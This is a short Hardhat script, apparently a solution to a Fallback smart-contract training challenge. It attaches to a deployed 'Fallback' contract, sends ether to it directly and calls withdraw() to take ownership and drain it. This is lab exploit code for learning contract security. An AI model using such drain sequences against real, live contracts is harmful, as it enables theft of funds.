import { ethers } from "hardhat";
import { TelephoneAttack__factory } from "../typechain-types/factories/Exercise4/TelephoneHack.sol/TelephoneAttack__factory"


async function main() {
//   const Etherstore = await ethers.getContractFactory("Fallback");
//   const etherstore = await Etherstore.deploy();
//   await etherstore.deployed();
//   console.log(`deployed to ${etherstore.address}`);

//   retourne l'adresse du wallet grace a la clé privé dans.env
  const [addr1] = await ethers.getSigners();
  console.log(addr1.address);
  const deployedAddress = '0xBBb1A75bF59535bB36B46d405B92301675459964';
  const Fallback = await ethers.getContractFactory("Fallback");
  const fallback = await Fallback.attach(deployedAddress);

  await addr1.sendTransaction({
    to:deployedAddress,
    value:100,
    })

    await fallback.connect(addr1).withdraw();




}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
